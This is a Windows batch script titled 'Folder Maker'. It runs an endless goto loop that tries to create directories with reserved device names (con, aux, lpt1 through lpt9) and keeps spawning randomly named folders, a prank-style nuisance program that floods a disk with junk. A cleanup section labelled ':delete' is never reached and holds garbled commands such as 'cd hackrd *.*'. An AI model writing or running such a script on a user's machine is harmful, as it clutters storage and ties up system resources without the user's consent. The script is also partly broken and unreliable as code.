cls
@echo off
color 0a
mode 1000
title Folder Maker
md con\
:top
cd con\
md con\
md aux\
md lpt1\
md lpt2\
md lpt3\
md lpt4\
md lpt5\
md lpt6\
md lpt7\
md lpt8\
md lpt9\
md %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%%random% %random% %random% %random% %random% %random%
goto top
:delete
cd new 
rd *.*
cd hackrd *.*
cd file
rd *.*
rd con\
rd aux\
rd lpt1\
rd lpt2\
rd lpt3\
rd lpt4\
rd lpt5\
rd lpt6\
rd lpt7\
rd lpt8\
rd lpt9\
rd new\
exit